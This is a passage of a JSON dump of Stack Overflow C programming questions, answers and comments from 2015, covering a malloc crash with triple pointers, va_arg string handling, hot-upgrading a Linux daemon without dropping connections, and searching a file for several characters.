"creation_date": 1447263234, "post_id": 33656276, "comment_id": 55085988, "body": "@JohnB count = 1 prior to crash"}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1447263280, "post_id": 33656276, "comment_id": 55086010, "body": "The number of files in a directory can change in between you allocating the array and copying the names. Run the program in a debugger (ex. gdb or the visual studio debugger) to find out where it crashes."}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 3, "creation_date": 1447263352, "post_id": 33656276, "comment_id": 55086056, "body": "Also I&#39;m not sure of the order of operations of <code>*nameDest[count]</code>; it might be doing the index before the pointer deference. Try doing <code>(*nameDest)[count]</code>"}, {"owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "reply_to_user": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1447263395, "post_id": 33656276, "comment_id": 55086085, "body": "@ColonelThirtyTwo That fixed it, thanks, add as an answer please"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447263785, "post_id": 33656276, "comment_id": 55086313, "body": "suggest googling for &#39;three star programmer&#39;"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447264279, "post_id": 33656276, "comment_id": 55086599, "body": "As <code>count</code> increases, the <code>dest</code> must be updated via a call to <code>realloc()</code> so there is enough allocated memory to hold the pointers to the individual file names"}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447269900, "post_id": 33656276, "comment_id": 55090022, "body": "@user3629249 IMO the triple-star here is appropriate, since the function has an out parameter (first star) that writes to an array (second star) of strings (char and third star)."}], "answers": [{"comments": [{"owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "edited": false, "score": 0, "creation_date": 1447264258, "post_id": 33656544, "comment_id": 55086581, "body": "This is for a school assignment, were it production code I would do some of these optimizations, but for the purpose of the assignment we are allowed to assume nothing will change"}], "tags": [], "owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "is_accepted": true, "score": 1, "last_activity_date": 1447263699, "last_edit_date": 1495539869, "creation_date": 1447263699, "answer_id": 33656544, "question_id": 33656276, "link": "https://stackoverflow.com/questions/33656276/malloc-causing-crash-with-de-referenced-2-d-character-array-in-loop/33656544#33656544", "title": "malloc() causing crash with de-referenced 2-D character array in loop", "body": "<p>In <code>*nameDest[count]</code>, <a href=\"https://stackoverflow.com/questions/3552844/order-of-operations-for-dereference-and-bracket-ref-in-c\">the indexing operator place before the dereference operator</a>, making the code equivalent to <code>*(nameDest[count])</code>, which is not what you want since <code>nameDest</code> points to the array. You need to do the pointer dereference before the array indexing by using parenthesis: <code>(*nameDest)[count]</code></p>\n\n<p>I should also note that polling the OS twice for the directory listing - once for the count and once for the actual names - is unreliable, as between the two polls, the count might have changed. Consider using <code>realloc</code> to resize the array as you find more entries.</p>\n"}, {"comments": [{"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447263854, "post_id": 33656547, "comment_id": 55086352, "body": "sizeof(char) expresses the intent of the original programmer, so there is no doubt of what the code does when a maintainer might question whether there is a sizeof missing in the allocation. Because the code is less consistent it is less readable."}, {"owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "edited": false, "score": 1, "creation_date": 1447264327, "post_id": 33656547, "comment_id": 55086627, "body": "It does not accomplish nothing, it accomplishes transparency and readability."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447264760, "post_id": 33656547, "comment_id": 55086889, "body": "It is expected that the original programer and and maintenance programmers all know that the memory allocation functions, like <code>malloc()</code> have a parameter that is a count of bytes.   It is sort of like:  here is a number:  <code>25</code>,  that is perfectly well understood.   Now here is a number multiplied by 1 <code>1*25</code>.   Which is more readable?  Which is more understandable?  Additionally, when your code gets &#39;peer reviewed&#39; at work, what will happen?  Answer: the code will get &#39;dinged&#39; and an <code>action item</code> written to remove the superfluous expression: <code>sizeof( char )</code>"}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447419885, "post_id": 33656547, "comment_id": 55158197, "body": "@user3629249 You haven&#39;t provided any arguments why is an integer constant value better. You also haven&#39;t addressed my and EyeOfTheHawks&#39; arguments. Your two question, <i>Which is more readable? Which is more understandable?</i>, are addressed by the first two comments. Your last argument is an anecdote and thus is not an argument."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447476400, "post_id": 33656547, "comment_id": 55182613, "body": "??arguments??  I&#39;m providing commentary not arguments.  As you should know, commentary often contains <code>best practices</code> and <code>common practice</code> information.  (like checking returned values from system functions for errors).   Why do you want an argument for/against <code>best practices</code>?  BTW: my comments are about clarity of the code, not about weather to use a variable or a constant as a parameter."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447780496, "post_id": 33656547, "comment_id": 55293699, "body": "why the down votes?  This line: <code>*nameDest = (char**)malloc(sizeof(char*)*count);</code> clearly says there are <code>count</code> pointers available (which can be indexed by 0...count-1) So, all lines that are referencing <code>*nameDest[count]</code> are accessing beyond the end of the array: Here is an example: <code>*nameDest[count] = (char*) malloc(sizeof(char)*strlen(findData.cFileName) + 1);</code>"}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": -1, "last_activity_date": 1447263716, "creation_date": 1447263716, "answer_id": 33656547, "question_id": 33656276, "link": "https://stackoverflow.com/questions/33656276/malloc-causing-crash-with-de-referenced-2-d-character-array-in-loop/33656547#33656547", "title": "malloc() causing crash with de-referenced 2-D character array in loop", "body": "<p>Several problems in the code </p>\n\n<p>1) the expression: <code>sizeof(char)</code> is defined as 1 and multiplying anything by 1 has no effect, especially as part of a malloc() parameter, so it just clutters the code and accomplishes nothing. </p>\n\n<p>Suggest removing the <code>sizeof(char)</code> expressions.  </p>\n\n<p>2) the memory allocation family (malloc, calloc, realloc) have a returned type of <code>void*</code> which can be assigned to any other pointer, so the cast is unneeded, just clutters the code and is a real headache when debugging and/or maintaining the code.  </p>\n\n<p>Suggest remove the casting of the returned values from malloc()</p>\n\n<p>3) in C, array offsets start with 0 and end with array size -1  So when an array of size <code>count</code> is allocated, the valid offsets are 0...count-1.</p>\n\n<p>However, the posted code is accessing array[count] which is past the end of the array, this is undefined behaviour and can/will lead to a seg fault event.</p>\n"}], "owner": {"reputation": 566, "user_id": 2812438, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/a5249ad0b843a058edddce70e58c61fb?s=128&d=identicon&r=PG", "display_name": "EyeOfTheHawks", "link": "https://stackoverflow.com/users/2812438/eyeofthehawks"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "accepted_answer_id": 33656544, "answer_count": 2, "score": 0, "last_activity_date": 1447263716, "creation_date": 1447262862, "question_id": 33656276, "link": "https://stackoverflow.com/questions/33656276/malloc-causing-crash-with-de-referenced-2-d-character-array-in-loop", "title": "malloc() causing crash with de-referenced 2-D character array in loop", "body": "<p>Arrays is initialized as:</p>\n\n<pre><code>char** aldos = NULL;\nchar** aldoFilenames = NULL;\n</code></pre>\n\n<p>Function definition is:</p>\n\n<pre><code>int readFilesFromDirectory(char*** dest, char*** nameDest)\n</code></pre>\n\n<p>Passed to function via:</p>\n\n<pre><code>readFilesFromDirectory(&amp;aldos, &amp;aldoFilenames);\n</code></pre>\n\n<p>After counting the files, dest and nameDest are initialized:</p>\n\n<pre><code>*dest = (char**)malloc(sizeof(char*)*count);\n*nameDest = (char**)malloc(sizeof(char*)*count);\ncount = 0; //resetting to read in the files again\n</code></pre>\n\n<p>First filename for nameDest is read in like:</p>\n\n<pre><code>*nameDest[count] = (char*) malloc(sizeof(char)*strlen(findData.cFileName) + 1);\nstrcpy(*nameDest[count], findData.cFileName);\n//can confirm in my program, the value exists properly in *nameDest[count]\ncount++;\n</code></pre>\n\n<p>Heres where the problem comes in, when I throw it in a loop, it crashes (with no real useful error codes):</p>\n\n<pre><code>while (FindNextFile(hfind, &amp;findData) != 0) \n{\n  *nameDest[count] = (char*) malloc(sizeof(char)*strlen(findData.cFileName) + 1); //doesnt make it past here, CRASH\n   sprintf(*nameDest[count],\"%s\\0\",findData.cFileName);\n   count++;\n }\n</code></pre>\n\n<p>Any insight would be appreciated, I'll be quick to add more information if requested</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447262998, "post_id": 33656263, "comment_id": 55085829, "body": "Why is the first argument 2?"}, {"owner": {"reputation": 1781, "user_id": 1903439, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c5a7496e3c21262f8103c27b8ff59837?s=128&d=identicon&r=PG", "display_name": "user1903439", "link": "https://stackoverflow.com/users/1903439/user1903439"}, "reply_to_user": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447263094, "post_id": 33656263, "comment_id": 55085894, "body": "first argument &#39;2&#39; is for other use.. not related to others atall !"}], "answers": [{"tags": [], "owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "is_accepted": false, "score": 1, "last_activity_date": 1447264004, "last_edit_date": 1447264004, "creation_date": 1447263122, "answer_id": 33656350, "question_id": 33656263, "link": "https://stackoverflow.com/questions/33656263/correctly-using-va-arg-to-fetch-strings/33656350#33656350", "title": "correctly using va_arg to fetch strings", "body": "<p>\"yes\" has the type <code>char*</code>, and that is the type you should use:</p>\n\n<pre><code>char* literal = va_arg(argList, char* );\n</code></pre>\n\n<p>String literals are read only, so if you intend to pass only them, or if you don't intend to modify the array the pointer is pointing to, you could instead use const char*, to so you don't modify them by accident.</p>\n\n<p>Then obtain the length of the string <code>literal</code>, allocate storage for a copy <code>result</code>, and copy the string.</p>\n"}], "owner": {"reputation": 1781, "user_id": 1903439, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c5a7496e3c21262f8103c27b8ff59837?s=128&d=identicon&r=PG", "display_name": "user1903439", "link": "https://stackoverflow.com/users/1903439/user1903439"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 420, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447264004, "creation_date": 1447262827, "question_id": 33656263, "link": "https://stackoverflow.com/questions/33656263/correctly-using-va-arg-to-fetch-strings", "title": "correctly using va_arg to fetch strings", "body": "<p>in <code>main.c</code> I call <code>function(2, \"string\", \"yes\")</code></p>\n\n<p>where</p>\n\n<pre><code>   void function(UINT16 id, const char *ptr_argDescr, ...)\n    {\n       va_start(argList, ptr_argDescr);\n\n       va_arg(argList, ? );\n\n//and how to copy in array result\n</code></pre>\n\n<p>In <code>function</code> I want to get <code>yes</code> and then copy it in an array called <code>result</code> How should i call va_arg ? Please don't suggest vsprintf. I want to know how I can do it the above mentioned way</p>\n"}, {"tags": ["c", "network-programming"], "answers": [{"comments": [{"owner": {"reputation": 4733, "user_id": 922445, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a469120d35647d9aa50646cb4d778c71?s=128&d=identicon&r=PG&f=1", "display_name": "Nulik", "link": "https://stackoverflow.com/users/922445/nulik"}, "edited": false, "score": 0, "creation_date": 1447264173, "post_id": 33656359, "comment_id": 55086536, "body": "I agree, this is the cheapest (in term of development times) alternative. Maybe i will go for it. But this only works if the data structure (variables) doesn&#39;t change. So, your suggestion is VERY good, something i didn&#39;t thought of, but it is still 50% of the solution."}], "tags": [], "owner": {"reputation": 57, "user_id": 4244472, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a0478dd0fe807364e872e7863bca86da?s=128&d=identicon&r=PG&f=1", "display_name": "swiley", "link": "https://stackoverflow.com/users/4244472/swiley"}, "is_accepted": false, "score": 0, "last_activity_date": 1447263147, "creation_date": 1447263147, "answer_id": 33656359, "question_id": 33656054, "link": "https://stackoverflow.com/questions/33656054/upgrade-server-executable-without-losing-users-connections/33656359#33656359", "title": "upgrade server executable without losing user&#39;s connections", "body": "<p>One alternative is to write most of your demon as a shared library and use dlopen to link the new functions  into the running process. This means some parts can't be changed and you might have concurrency issues but it removes the need for IPC.</p>\n"}, {"comments": [{"owner": {"reputation": 4733, "user_id": 922445, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a469120d35647d9aa50646cb4d778c71?s=128&d=identicon&r=PG&f=1", "display_name": "Nulik", "link": "https://stackoverflow.com/users/922445/nulik"}, "edited": false, "score": 0, "creation_date": 1447441712, "post_id": 33658593, "comment_id": 55171993, "body": "Thanks, this is an excellent way to copy the file descriptors. +1 for that."}], "tags": [], "owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "is_accepted": false, "score": 1, "last_activity_date": 1447271001, "creation_date": 1447271001, "answer_id": 33658593, "question_id": 33656054, "link": "https://stackoverflow.com/questions/33656054/upgrade-server-executable-without-losing-users-connections/33658593#33658593", "title": "upgrade server executable without losing user&#39;s connections", "body": "<p>Another alternative is to force the <code>old_daemon</code> to <code>fork()/exec()</code> the <code>new_daemon</code> and immediately stop accepting. The <code>new_daemon</code> would inherit the listening socket, existing connections, and open files (unless they are <code>fcntl</code>'d to <code>FD_CLOEXEC</code>) automagically.</p>\n\n<p>That said, I don't think there is a clean way to hand over incomplete jobs (as I understand steps 4 and 5 try to accomplish). If possible, let the <code>old_daemon</code> complete them.</p>\n"}], "owner": {"reputation": 4733, "user_id": 922445, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a469120d35647d9aa50646cb4d778c71?s=128&d=identicon&r=PG&f=1", "display_name": "Nulik", "link": "https://stackoverflow.com/users/922445/nulik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1447271001, "creation_date": 1447262157, "question_id": 33656054, "link": "https://stackoverflow.com/questions/33656054/upgrade-server-executable-without-losing-users-connections", "title": "upgrade server executable without losing user&#39;s connections", "body": "<p>I need to develop a mechanism to upgrade a running daemon in production environment to a new version without losing client's (TCP) connections. Something similar to what nginx does when you upgrade it to a new version. I need this for bug removal or to release minor version changes, which may be once a day. The daemon is developed in C for Linux platform. </p>\n\n<p>The process for the upgrade would be like this:</p>\n\n<ol>\n<li>The new_daemon would be ran from the command line specifying the process id of the old_daemon</li>\n<li>The new_daemon would connect via socket to the old daemon to send/receive data and mesages.</li>\n<li>The new_daemon would send the old_daemon a message to stop listening on the <em>PORT</em> which is used to receive client's connections. After confirming the detention of the listening service, the new_daemon would start listening on <em>PORT</em></li>\n<li>The new_daemon would send the message to old_daemon to send currently open file descriptors of the user's connections. Using the system call sendmsg() the old_daemon would pass the new_daemon all resources it has allocated with the kernel, not only the connections, but also all open files.</li>\n<li>The new_daemon would send the message to old_daemon to pass all global memory variables and the old_daemon would send it over the socket connection between both processes.</li>\n</ol>\n\n<p>This process is very complex, so I would like to ask if someone can suggest a better process or maybe there is some methodology to do this easily? The goal is to have the least downtime during the upgrade process.</p>\n\n<p>TIA</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 1, "creation_date": 1447261978, "post_id": 33655961, "comment_id": 55085221, "body": "use <code>fgets</code> to read strings and then search."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267152, "post_id": 33655961, "comment_id": 55088412, "body": "Also: <code>char ch;</code> --&gt; <code>int ch;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267492, "post_id": 33656273, "comment_id": 55088627, "body": "1) D&#39;oh! Thanks. 2) It will? Why?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267531, "post_id": 33656273, "comment_id": 55088656, "body": "Because  <code>&quot;34ab&quot;</code> has 5 <code>char</code> in it and <code>ch == 0</code> matches one of them. &quot;The strchr function locates the first occurrence of c (converted to a char) in the string pointed to by s. The terminating null character is considered to be part of the string.&quot;"}, {"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267684, "post_id": 33656273, "comment_id": 55088736, "body": "That wouldn&#39;t stop the program. It would simply count the <code>&#39;\\0&#39;</code> character. Perhaps not the expected behavior, but it wouldn&#39;t stop."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267895, "post_id": 33656273, "comment_id": 55088875, "body": "1) Did not suggest code would stop.  But if the source file had the unlikely null character in it, incorrect results would occur.  2) Yes, <code>memchr()</code> is a superior solution."}, {"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447267938, "post_id": 33656273, "comment_id": 55088901, "body": "&quot;Note: code will <b>stop</b> the first time ch == &#39;\\0&#39;.&quot;"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447268067, "post_id": 33656273, "comment_id": 55088976, "body": "Agreed, my initial comment should have been &quot;\t Note: code will match when `ch == &#39;\\0&#39;&quot;."}, {"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1447268179, "post_id": 33656273, "comment_id": 55089040, "body": "Oh, <i>that</i> kind of stop :)"}, {"owner": {"reputation": 129, "user_id": 4730514, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/3d67ea24660692df9f41c943d10cc5fd?s=128&d=identicon&r=PG&f=1", "display_name": "Dezhou Zhang", "link": "https://stackoverflow.com/users/4730514/dezhou-zhang"}, "edited": false, "score": 0, "creation_date": 1447325155, "post_id": 33656273, "comment_id": 55112153, "body": "it seems, strchr function is still looking for single characters, I wanted to search a number for instance 34, it searches number 3, and number 4. Or am i doing it in a wrong way?"}, {"owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "edited": false, "score": 0, "creation_date": 1447328994, "post_id": 33656273, "comment_id": 55114362, "body": "For that you need to use <code>strstr()</code> or such. <code>man strstr</code> or google it."}], "tags": [], "owner": {"reputation": 12289, "user_id": 675568, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1cfe53579fb7b2afd58949be94cf97e?s=128&d=identicon&r=PG", "display_name": "Tom Zych", "link": "https://stackoverflow.com/users/675568/tom-zych"}, "is_accepted": false, "score": 0, "last_activity_date": 1447267814, "last_edit_date": 1447267814, "creation_date": 1447262859, "answer_id": 33656273, "question_id": 33655961, "link": "https://stackoverflow.com/questions/33655961/how-to-search-txt-in-a-file-not-a-character/33656273#33656273", "title": "how to search txt in a file not a character", "body": "<p>Use <code>strchr()</code> to search for each input character in a string:</p>\n\n<pre><code>const char *search_group = \"34ab\";\n...\nif (strchr(search_group, ch))\n</code></pre>\n\n<p><code>strchr()</code> returns NULL if the character isn't found, or a pointer to\nthe first match.</p>\n\n<p>Edit suggested by chux's comment: if you don't want <code>'\\0'</code> to be considered\na part of the search group, use <code>memchr</code> instead.</p>\n"}], "owner": {"reputation": 129, "user_id": 4730514, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/3d67ea24660692df9f41c943d10cc5fd?s=128&d=identicon&r=PG&f=1", "display_name": "Dezhou Zhang", "link": "https://stackoverflow.com/users/4730514/dezhou-zhang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1447267814, "creation_date": 1447261906, "last_edit_date": 1447262816, "question_id": 33655961, "link": "https://stackoverflow.com/questions/33655961/how-to-search-txt-in-a-file-not-a-character", "title": "how to search txt in a file not a character", "body": "<pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;string.h&gt;\n\nint main()\n{\n   FILE *fp1;\n   fp1 = fopen(\"math.dat\", \"r\");\n   char ch;\n   int i=0;\n\n while (1) {\n      ch = fgetc(fp1);                       \n      if (ch == '3')\n          i++;\n      if (ch == EOF)\n          break;\n}\n\n   printf(\"there is : %d matches\\n\", i);\n\n   return(0);\n}\n</code></pre>\n\n<p>This code is only for searching number \"3\" in the txt file called math.dat.  I would like to search more than one character. Can anyone help?</p>\n"}, {"tags": ["c", "macros"], "comments": [{"owner": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447262147, "post_id": 33655912, "comment_id": 55085329, "body": "I write it mistakenly... It is return"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "edited": false, "score": 0, "creation_date": 1447262276, "post_id": 33655982, "comment_id": 55085408, "body": "But our question asked us for the output. How should I calculate the output?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 97, "user_id": 5157094, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d46e5a8960bd8f176902bd1bc9cf56c0?s=128&d=identicon&r=PG", "display_name": "Farzad", "link": "https://stackoverflow.com/users/5157094/farzad"}, "edited": false, "score": 0, "creation_date": 